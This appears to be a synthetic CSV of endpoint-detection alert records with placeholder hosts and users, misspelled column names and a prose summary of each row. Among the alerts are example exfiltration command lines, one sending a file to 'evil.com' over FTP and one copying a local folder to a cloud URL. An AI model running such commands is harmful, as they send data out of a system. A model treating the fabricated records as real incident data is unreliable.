AlertID,AlertTimestamp,MachineId,ComputerName,Severity,AlertName,AlertType,Category,AlertDescription,Status,ExtendedProperties,event_id,event_type,event_timestamp,event_category,severity,detect_description,detect_id,technique,device_name,file_name,file_size,src_path,dst_path,user_name,process_name,AlertSeverity,Recommendation,RuleName,Source,Tactic,Technique,AlertCategory,HostName,FilePath,ProcessName,CommandLine,MD5Hash,SHA256Hash,IPAddress,UserName,ProcessID,ParentProcessID,DetectionId,event_description,Details,EndpointID,EndpointName,ParentProcessName,ParentProcessPath,ProcessPath,host,user,process,network,detection,FallbackProtocol,DestinationIP,DestinationPort,artifact_hiding,security_control_disablement,Event,Host,User,Action,Reason,event_time,alert_rule_name,technique_name,tactic,process_id,command_line,destination_ip,destination_port,source_ip,source_port,ProcessId,DestinationIp,SourceIp,SourcePort,AlertTimestamps,file_path,file_hash,process_hash,parent_process_name,parent_process_hash,registry_modification,subtype,recommendation,detection_details,product,mitre,endpoint,attack_details,event_severity,protocol,process_command_line,parent_process_command_line,parent_process_id,SourceIP,Protocol,ProcessCommandLine,ParentProcessCommandLine,event_categfory,event_Timestamp,Affected_Hostname,Affected_File_Path,Alert_Source,alert_severity,action_taken,detection_source,ProcessHash,ProcessParentName,ProcessParentPath,ProcessParentHash,tactics,affected_entities,recommendations,source,destination,threat_severity,threat_category,threat_name,indicators,ioc,description,Description,Endpoint,DetectionSource,AlertyDescription,MACAddress,EventLogName,EventLogMessage,AdditionalInfo,AffectedHost,AffectedProcess,AffectedFilePath,Commandline,ParentProcess,DetectionMethod,RecommendedActions,event_catefory,affected_hosts,event_details,event_name,alert_type,event,Field,Operator,Value,Tags,RegistryKey,RegistryValue,type,timestamp,Title,Affected_Image_Path,Timestamp,Injected_Process_Name,Loader_Process_Name,Loader_Technique,event_Source,EventType,EventCategory,TargetResource,Operation,SuspiciousAction,Domain_Controller_IP,Domain_Controller_Name,EntityName,EntityType,Hostname,event_version,event_categorty,kill_chain,image_loaded,target_image_loaded,target_image_name,target_command_line,detection_method,AlertNmae,IP,OS,category,action,event_data,data,ArtifactType,ArtifactPath,ArtifactName,sensor_id,customer_id,event_info,AffectedHostname,AffectedFile_Path,AlertSource,Parent_Process_Name,Injection_Technique,technique_id,subtechnique_id,subtechnique,additional_info,vendor,path,domain,ip_address,Name,event_subtype,src_ip,dst_ip,container_name,image_name,image_digest,registry,command,process_path,username,actor,host_info,event_url,event_hash,event_action,event_source,OperatingSystem,web_server_url,web_server_method,AssignedTo,ClosedTime,DataTTL,DetectionTime,DetectionType,IsIncident,LastUpdateTime,DomainName,DnsName,FullyQualifiedDomainName,NetBiosName,OSPlatform,OSVersion,ProcessorArchitecture,CreationTime,End,FileHash,FileName,Start,VendorName,VendorSeverity,VendorThreatName,trigger,remediation,metadata,process_injection,ControlName,file_write,actions,alert_data,tags,Type,Condition,ImageLoaded,TargetImageLoaded,TargetImageName,TargetCommandLine,KillchainPhase,TechniqueID,Techniqu,Affected_Device,Affected_User,Malicious_Executable,detection_id,detection_time,detection_score,threat_score,device_id,device_external_ip,device_os,device_os_version,policy_name,policy_id,subcategory,rule_name,hostname,ip,process_pid,files,MachineName,sha1_hash,local_ip,public_ip,malware_family,org_id,event_event_name,kill_chain_phases,data_source,DeviceName,DeviceId,OsPlatform,OsVersion,ProcessCreationTime,ParentProcessCreationTime,TargetDevice,TargetDeviceId,TargetOsPlatform,TargetOsVersion,TargetUserName,AlertDDescription,Endpoint_ID,Endpoint_Name,Endpoint_IP,Process_Name,parent_process_pid,c2,native_function_calls,TECHNIQUE,SourceIPAddress,DestinationIPAddress,Domain,ThreatName,IOC,TimestampUtc,SHA256,WebServiceName,WebServicePath,file,parent_process,os,pid,access_type,operation,InjectedProcessName,InjectionTechnique,AleertDescription,AlertDetails,mitre_technique,ContainerImageName,ContainerRuntime,DeploymentMethod,ParentProcessId,EndpointIP,C2Server,ExfiltratedData,ExfiltrationMethod,UserDomain,ProcessParentID,Detection_Details,Process_Path,Process_Command_Line,AffectedImagePath,machine_id,user_id,alert_name,remote_address,remote_port,local_address,local_port,AlertId,RemoteServer,ParentCommandLine,EventID,Hash,ParentHash,ExecutionStatus,event_cagtegory,remediation_steps,AffectedHostInfo,DetectionDetails,TECHNIQUE_NAME,TACTIC,Signer,Process Name,PID,Path,HostIP,KillChain,EndpointDetails,detected_by,details,device,TargetUser,OriginalPermissions,NewPermissions,cloud_infrastructure_modification,CloudProvider,APIOperation,evebnt_category,EntityValue,creationTimeUtc,status,recommendedActions,vendorInformation,properties,src_port,remote_ip,Target,Port,AffectedEndpoints,IndicatorsOfCompromise,RemovableMediaName,RemovableMediaVendor,RemovableMediaType,RemovableMediaSerialNumber,RemovableMediaCapacity,RemovableMediaAccessedTime,RemovableMediaAction,AffectedFileSize,TechniqueName,ProcessPid,ParentProcessPid,Direction,RemoteServiceName,RemoteServiceType,RemoteServicePorts,RemoteServiceIpv4,RemoteServiceIpv6,RemoteServiceUrl,RemoteServiceCertificate,RemoteServiceEncryption,RemoteServiceAuthentication,RemoteServiceVersion,RemoteServiceProduct,RemoteServiceOrganization,file_permission_modification,Product,AttackType,AttackDuration,AffectedServices,EventTime,application,threat,affected_host,alert_category,alert_recommendation,alert_details,References,target,attack_name,affected_process,affected_file_path,recommended_actions,host_name,md5_hash,sha256_hash,AlertTimestampUtc,EventId,WebServerUrl,WebServerMethod,process_execution,event_ category,detect_name,rule_description,triggered_rule,remote_server,CloudAccount,endpoint_id,web_service_name,web_service_path,ProcessParentCommandLine,AttackVector,alert_rule_id,alert_state,alert_time,src,process_tree,ioc_type,ioc_value,process_details,host_details,file_info,network_info,email_sender,email_recipient,email_subject,email_urls,email_attachments,ip_addresses,mac_addresses,operating_system,agent_version,group_name,Vendor,Username,name,event_creator,mitre_attack_id,cloud_account,detection_info,URL,file_deletion,AttackTactic,AttackTechnique,EntityId,EntityIp,MachineDomainName,AlertLink,AlertTime,UserInfo,PhishingInfo,DetectionID,EventHash,AffectedEntities,KillChainPhase,RemediationSteps,Alertescription,modified_time,original_hash,current_hash,event)category,combined_data
1350df0e,2023-03-10T13:30:00Z,,,High,Process Injection,,,Process injection is a method of executing arbitrary code in the address space of a separate live process.,,,,,,,,,,,,,,,,,,,Investigate the injected process and parent process to determine the nature and purpose of the injection and remediate accordingly.,,,Defense Evasion,Process Injection,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,hostname123,,Defender for Endpoint EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,notepad.exe,Thread Execution Hijacking,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is 1350df0e. AlertTimestamp is 2023-03-10T13:30:00Z. Severity is High. AlertName is Process Injection. AlertDescription is Process injection is a method of executing arbitrary code in the address space of a separate live process.. Recommendation is Investigate the injected process and parent process to determine the nature and purpose of the injection and remediate accordingly.. Tactic is Defense Evasion. Technique is Process Injection. Affected_Hostname is hostname123. Alert_Source is Defender for Endpoint EDR. Injected_Process_Name is explorer.exe. Parent_Process_Name is notepad.exe. Injection_Technique is Thread Execution Hijacking. 
,,,,,,,,,,,12345,threat detection,1646749655000,Suspicious Shared Module Loaded,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Adversaries may execute malicious payloads via loading shared modules.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,THREAT,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,12345678,123456,,,,,,,,,,,,,mydomain.local,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mycomputer,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"['192.168.1.100', 'fe80::1234:5678:90ab:cdef']",['00:11:22:33:44:55'],Windows 10,6.30.0.0,Workstations,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 12345. event_type is threat detection. event_timestamp is 1646749655000. event_category is Suspicious Shared Module Loaded. event_description is Adversaries may execute malicious payloads via loading shared modules.. type is THREAT. sensor_id is 12345678. customer_id is 123456. domain is mydomain.local. hostname is mycomputer. ip_addresses are 192.168.1.100; fe80::1234:5678:90ab:cdef; mac_addresses are 00:11:22:33:44:55; operating_system is Windows 10. agent_version is 6.30.0.0. group_name is Workstations. 
iododw0r,2022-04-01T09:22:14.866Z,,,High,Deployment Tool,,,An instance of a software deployment tool was detected on a system,,,,,,,,,,,,,,,,,,,,,,,,,,,microsoft.deploymentsomething.exe,,,,192.168.0.10,,1234.0,5678.0,,,,,,setup.exe,C:\Users\Admin\Downloads\setup.exe,C:\Program Files (x86)\Microsoft\Deployment\v10.0\Bin\microsoft.deploymentsomething.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,microsoft.deploymentsomething.exe /install /quiet,setup.exe /install,,,,,,,,,,,,,,,,,,,,,,,,,,EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Hostname-01,Endpoint,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Microsoft Defender for Endpoint,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is iododw0r. AlertTimestamp is 2022-04-01T09:22:14.866Z. Severity is High. AlertName is Deployment Tool. AlertDescription is An instance of a software deployment tool was detected on a system. ProcessName is microsoft.deploymentsomething.exe. IPAddress is 192.168.0.10. ParentProcessName is setup.exe. ParentProcessPath is C:\Users\Admin\Downloads\setup.exe. ProcessPath is C:\Program Files (x86)\Microsoft\Deployment\v10.0\Bin\microsoft.deploymentsomething.exe. ProcessCommandLine is microsoft.deploymentsomething.exe /install /quiet. ParentProcessCommandLine is setup.exe /install. DetectionSource is EDR. EntityName is Hostname-01. EntityType is Endpoint. Vendor is Microsoft Defender for Endpoint. 
445566778888,2023-03-10T14:30:00.000Z,,,High,Build Image on Host Detected,,,The endpoint has detected an attempt to build an image on the host system. This behavior is consistent with the MITRE ATT&CK technique T1612.,,,,,,,,,,,,,,,,,,,,,,,,Endpoint Detection and Response,,,docker,,,,192.168.1.100,,1234.0,5678.0,,,,,,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Program Files\Docker\Docker\Docker Desktop.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"""C:\Program Files\Docker\Docker\Docker Desktop.exe""",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,ExampleHost01,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Build Image on Host,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,JohnDoe,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is 445566778888. AlertTimestamp is 2023-03-10T14:30:00.000Z. Severity is High. AlertName is Build Image on Host Detected. AlertDescription is The endpoint has detected an attempt to build an image on the host system. This behavior is consistent with the MITRE ATT&CK technique T1612.. AlertCategory is Endpoint Detection and Response. ProcessName is docker. IPAddress is 192.168.1.100. ParentProcessName is powershell.exe. ParentProcessPath is C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe. ProcessPath is C:\Program Files\Docker\Docker\Docker Desktop.exe. ProcessCommandLine is C:\Program Files\Docker\Docker\Docker Desktop.exe. Hostname is ExampleHost01. TechniqueName is Build Image on Host. Username is JohnDoe. 
,,,,,,,,,,,12345,alert,1646749655000,scheduled task,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,A scheduled task/job was created or modified on the system.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Potential Use of Scheduled Task/Job,,,,,,,,,,,,,"[{'entity_type': 'system_process', 'entity_name': 'Task Scheduler', 'host_info': {'hostname': 'DESKTOP-ABC123', 'ip_address': '192.168.1.100'}, 'description': 'A new scheduled task/job was created or modified on the system.'}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 12345. event_type is alert. event_timestamp is 1646749655000. event_category is scheduled task. severity is high. event_description is A scheduled task/job was created or modified on the system.. event_categfory is Potential Use of Scheduled Task/Job. 
,,,,,,,,,,,EDR-123456,detect,,process-monitoring,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Detected suspicious inter-process communication between two different processes.,,,,,,,,,,,,,,,,,,,,,,2022-04-05T13:45:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"[{'entity_type': 'process', 'process_name': 'Process A', 'process_path': 'C:\\Program Files\\ProcessA\\ProcessA.exe', 'process_hash': 'ABCD1234', 'process_command_line': 'ProcessA.exe /arg1', 'process_pid': 1234}, {'entity_type': 'process', 'process_name': 'Process B', 'process_path': 'C:\\Windows\\System32\\cmd.exe', 'process_hash': 'EFGH5678', 'process_command_line': 'cmd.exe /c netstat', 'process_pid': 5678}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Suspicious Inter-Process Communication,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is EDR-123456. event_type is detect. event_category is process-monitoring. severity is high. event_description is Detected suspicious inter-process communication between two different processes.. event_time is 2022-04-05T13:45:00Z. name is Suspicious Inter-Process Communication. 
,,,,,,,,,,,095030332,RemovableMediaDetection,2022-03-04T10:25:00Z,Endpoint Detection and Response,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,An external device has been detected that may be attempting to replicate data to the endpoint.,,,,,,,,,,,,,,,,,,,,,,,,Replication Through Removable Media,Initial Access,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Users\User\Documents\SensitiveData.docx,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,T1091,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,USB Device,SanDisk,USB flash drive,123456.0,16 GB,2022-03-04T10:25:00Z,Copied Files,2 MB,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,{'type': 'Endpoint Monitoring'},,,,,,,,,,,,,,,,,,,,,,,,,event_id is 095030332. event_type is RemovableMediaDetection. event_timestamp is 2022-03-04T10:25:00Z. event_category is Endpoint Detection and Response. severity is high. event_description is An external device has been detected that may be attempting to replicate data to the endpoint.. technique_name is Replication Through Removable Media. tactic is Initial Access. AffectedFilePath is C:\Users\User\Documents\SensitiveData.docx. technique_id is T1091. RemovableMediaName is USB Device. RemovableMediaVendor is SanDisk. RemovableMediaType is USB flash drive. RemovableMediaCapacity is 16 GB. RemovableMediaAccessedTime is 2022-03-04T10:25:00Z. RemovableMediaAction is Copied Files. AffectedFileSize is 2 MB. event_creator type is Endpoint Monitoring. 
,,,,,,,,,,,12345678-1234-1234-1234-123456789012,alert,2023-03-08T14:30:00Z,transfer data to cloud,,,,,,,,,,,powershell.exe,,,,,,,,,,,,,,,,,,,Data Transfer to Cloud Account Detected,,,,,,,,,,,,,,,,,,,,,,,,,,5678.0,Copy-Item C:\LocalFolder -Destination https://mycloudstorage.com/myfolder,,,,,,,,,,,,,,,,,,,,,,,high,,,,,,,,,,,,,,,,CorwdStrike Falcon,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,T1537,https://mycloudstorage.com,,,,,,,,,,,,,,,,,,,,,,,event_id is 12345678-1234-1234-1234-123456789012. event_type is alert. event_timestamp is 2023-03-08T14:30:00Z. event_category is transfer data to cloud. process_name is powershell.exe. event_description is Data Transfer to Cloud Account Detected. command_line is Copy-Item C:\LocalFolder -Destination https://mycloudstorage.com/myfolder. event_severity is high. detection_source is CorwdStrike Falcon. mitre_attack_id is T1537. cloud_account is https://mycloudstorage.com. 
00030505,2023-03-08T14:30:00Z,,,High,Exfiltration Over Other Network Medium,,,This alert is triggered when data exfiltration is detected over an alternative network medium on an endpoint.,,,,,,,,,,,,,,,,,,,,,,,,,,,explorer.exe,,,,,JohnDoe,1234.0,,,,,,DESKTOP-ABC123,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,explorer.exe ftp://evil.com/SensitiveData.txt,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2023-03-08T14:00:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,,SensitiveData.txt,FTP,DOMAIN,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is 00030505. AlertTimestamp is 2023-03-08T14:30:00Z. Severity is High. AlertName is Exfiltration Over Other Network Medium. AlertDescription is This alert is triggered when data exfiltration is detected over an alternative network medium on an endpoint.. ProcessName is explorer.exe. UserName is JohnDoe. EndpointName is DESKTOP-ABC123. ProcessCommandLine is explorer.exe ftp://evil.com/SensitiveData.txt. ProcessCreationTime is 2023-03-08T14:00:00Z. EndpointIP is 192.168.1.100. ExfiltratedData is SensitiveData.txt. ExfiltrationMethod is FTP. UserDomain is DOMAIN. 
,,,,,,,,,,,12345,alert,1646749655000,Attempted Attack,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,An attempt was made to exploit a public-facing application on the host.,,,,,,,"{'hostname': 'host-123', 'ip_address': '192.168.0.1', 'mac_address': '00:11:22:33:44:55'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2023-03-04T10:30:00.000Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Exploit Public-Facing Application,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 12345. event_type is alert. event_timestamp is 1646749655000. event_category is Attempted Attack. event_description is An attempt was made to exploit a public-facing application on the host.. host hostname is host-123. host ip_address is 192.168.0.1. host mac_address is 00:11:22:33:44:55. timestamp is 2023-03-04T10:30:00.000Z. action is Exploit Public-Facing Application. 
,,,,,,,,,,,12345,DetectionSummaryEvent,,data_exfiltration,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Exfiltration Over Alternative Protocol,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2023-03-08T12:00:00.000000Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'hostname': 'example-hostname', 'domain': 'example-domain', 'os': 'Windows 10'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'detection_id': '12345678-1234-1234-1234-123456789012', 'detection_name': 'Exfiltration Detection', 'detection_description': 'Detects exfiltration over alternative protocol', 'detection_time': '2023-03-08T12:00:00.000000Z', 'rule_name': 'Exfiltration Detection Rule', 'rule_id': '12345678-1234-1234-1234-123456789012', 'ioc_info': {'ioc_type': 'protocol', 'ioc_value': 'DNS', 'ioc_description': 'Alternative exfiltration protocol'}, 'command_line': 'nslookup example.com 8.8.8.8'}",,,,,,,,,,,,,,,,,,,,,,event_id is 12345. event_type is DetectionSummaryEvent. event_category is data_exfiltration. severity is high. event_description is Exfiltration Over Alternative Protocol. timestamp is 2023-03-08T12:00:00.000000Z. host_info hostname is example-hostname. host_info domain is example-domain. host_info os is Windows 10. detection_info detection_id is 12345678-1234-1234-1234-123456789012. detection_info detection_name is Exfiltration Detection. detection_info detection_description is Detects exfiltration over alternative protocol. detection_info detection_time is 2023-03-08T12:00:00.000000Z. detection_info rule_name is Exfiltration Detection Rule. detection_info rule_id is 12345678-1234-1234-1234-123456789012. detection_info command_line is nslookup example.com 8.8.8.8. 
